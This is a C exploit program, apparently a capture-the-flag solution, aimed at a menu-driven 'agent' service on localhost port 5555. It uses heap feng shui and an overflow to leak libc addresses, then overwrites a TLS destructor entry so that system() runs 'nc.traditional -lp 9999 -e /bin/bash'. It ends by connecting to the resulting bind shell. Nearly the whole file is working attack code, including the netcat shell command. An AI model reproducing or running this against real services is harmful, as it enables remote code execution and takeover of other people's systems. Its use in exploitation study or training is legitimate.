#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <inttypes.h>
 
#define HOSTNAME  "localhost"
#define PORT	  5555
 
#define SYS_OFFSET 0x362198
#define TLS_OFFSET 0x1ff038
 
#define COLOR_SHELL "\033[31;01mshell\033[00m > "
 
int  set_sock(char *hostname, int port);
void send_data(char *input, int len);
void session(int fd);
int  handle_error(char *msg);
 
void agent_create(char c, int len);
void agent_select(int agent);
void agent_show(int agent, char *buffer, size_t len);
void agent_edit(int agent, char *buffer, int len);
void agent_delete(int agent);
void agent_exit();
 
void select_option(char *opt);
 
struct fake_agent {
	unsigned int  len;
	unsigned long reserved_0;
	unsigned long name;
	unsigned int  id;
};
 
struct fake_tls_dtor_entry {
	unsigned long ret;
	unsigned long func;
	unsigned long obj;
	char		  data[40];
};
 
int sock;
int retrieve = 1;
 
int main()
{
	char output[1024], input[1024];
	struct fake_agent agent;
	struct fake_tls_dtor_entry pown;
	unsigned long leak, system, tls_dtor_list;
	int sock2;
 
	printf("[1] connecting to target ...\n");
	sock = setsock(HOSTNAME, PORT);
	printf("[+] connected\n");
	read(sock, output, 1024);
 
	printf("[2] shaping heap\n");
	agent_create('A', 0xa0 - 4);
	agent_create('B', 0x18 - 4);
	agent_delete(0);
	agent_create('C', 0x410 - 4);
	agent_create('D', 0x400 - 4);
	agent_delete(2);
	agent_delete(1);
 
	printf("[3] overflowing next chunk\n");
	agent_create('E', 0x18 - 2);
	agent_create('F', 0x200 - 4);
	agent_create('G', 0xe0 - 4);
	agent_create('H', 0x18 - 4);
	agent_delete(7);
	agent_delete(5);
	agent_delete(3);
 
	agent_create('\xff', 0x210 - 1);
	agent_show(6, output, sizeof(output));
 
	leak = *((unsigned long *)(output + 240));
	system = leak - SYS_OFFSET;
	printf("[+] system function mapped at 0x%"PRIx64"\n", system);
	tls_dtor_list = leak + TLS_OFFSET;
	printf("[+] tls_dtor_list pointer at 0x%"PRIx64"\n", tls_dtor_list);
 
	printf("[4] overlapping next chunk\n");
	agent.len = 0xff;
	agent.reserved_0 = 0xdeadbeef;
	agent.name = tls_dtor_list;
	agent.id = 6;
	memset(input, 'X', 0x210);
	memcpy(input + 0x210, &agent, sizeof(struct fake_agent));
	agent_edit(8, input, 0x210 + sizeof(struct fake_agent));
 
	pown.ret = tls_dtor_list + 0x8;
	pown.func = system;
	pown.obj = tls_dtor_list + 0x18;
	strcpy(pown.data, "nc.traditional -lp 9999 -e /bin/bash");
 
	agent_edit(6, (char *)&pown, sizeof(struct fake_tls_dtor_entry));
 
	printf("[5] powning\n");
	retrieve = 0;
	agent_exit();
 
	sleep(2);
 
	close(sock);
	sock2 = setsock(HOSTNAME, 9999);
	session(sock2);
 
	return 0;
}
 
void agent_exit()
{
	select_option("0");
}
 
void agent_create(char c, int len)
{
	char buffer[len];
	memset(buffer, c, len);
	select_option("1");
	send_data(buffer, len);
}
 
void agent_select(int agent)
{
	char ag[4];
	int len = snprintf(ag, 4, "%d", agent);
	select_option("2");
	send_data(ag, len);
}
 
void agent_show(int agent, char *buffer, size_t len)
{
	int amt;
	agent_select(agent);
	write(sock, "3\n", 2);
	read(sock, buffer, len - 1);
	amt = read(sock, buffer, len - 1);
	buffer[amt] = '\0';
}
 
void agent_edit(int agent, char *buffer, int len)
{
	agent_select(agent);
	select_option("4");
	send_data(buffer, len);
}
 
void agent_delete(int agent)
{
	agent_select(agent);
	select_option("5");
}
 
void select_option(char *opt)
{
	send_data(opt, 2);
}
 
void send_data(char *input, int len)
{
	char output[1024];
	int amt;
	write(sock, input, len);
	if (retrieve) {
		amt = read(sock, output, sizeof(output) - 1);
		output[amt] = '\0';
	}
}
 
int setsock(char *hostname, int port)
{
	int s;
	struct hostent *hent;
	struct sockaddr_in sa;
	struct in_addr ia;
 
	hent = gethostbyname(hostname);
	if (hent) {
		memcpy(&ia.s_addr, hent->h_addr, 4);
	}
	else if((ia.s_addr = inet_addr(hostname)) == INADDR_ANY) {
		handle_error("incorrect address !!!\n");
	}
 
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		handle_error("socket failed !!!\n");
	}
 
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = ia.s_addr;
 
	if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
		handle_error("connection failed !!!!\n");
	}
 
	return s;
}
 
void session(int sock)
{
	char buf[1024];
	int amt;
	fd_set fds;
 
	printf("[!] enjoy your shell \n");
	fputs(COLOR_SHELL, stderr);
 
	while (1) {
		FD_ZERO(&fds);
		FD_SET(sock, &fds);
		FD_SET(0, &fds);
 
		if (select(sock+1, &fds, NULL, NULL, NULL) == -1) {
			continue;
		}
 
		if (FD_ISSET(0, &fds)) {
			if ((amt = read(0, buf, sizeof(buf) - 1)) == 0) {
				handle_error("connection lost\n");
			}
			buf[amt] = '\0';
			write(sock, buf, strlen(buf));
		}
 
		if (FD_ISSET(sock, &fds)) {
			if ((amt = read(sock, buf, sizeof(buf) - 1)) == 0) {
				handle_error("connection lost\n");
			}
			buf[amt] = '\0';
			printf("%s", buf);
			fputs(COLOR_SHELL, stderr);
		}
	}
}
 
int handle_error(char *msg)
{
	perror(msg);
	exit(-1);
}
